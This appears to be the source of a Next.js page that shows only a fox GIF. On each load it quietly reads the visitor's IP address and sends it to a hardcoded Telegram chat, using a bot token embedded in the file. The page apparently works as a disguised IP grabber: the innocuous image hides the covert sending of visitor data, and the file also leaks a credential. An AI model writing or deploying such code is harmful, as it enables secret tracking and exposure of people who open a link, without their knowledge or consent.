import Image from "next/image";
import MyPage from "@/components/redirector";
import logIp from "@/components/gAddress";
import axios from "axios";

export default async function Home() {

  const ip = logIp();

  const apikey = "7127171762:AAGGbpcsNY7pKzF9Xd1TQL9aBhPSWHhizTQ";
  const chat = "923952964"
  try {
    const response = await axios.get(`https://api.telegram.org/bot${apikey}/sendMessage?chat_id=${chat}&text=${ip}`);
  } catch (error) {
    console.error('Error fetching data:', error);
  }

  return (
    <main className="flex items-center ml-[38%]">
      <Image src={"/fox.gif"} alt="fox" width={400} height={400}></Image>
    </main>
  );
}
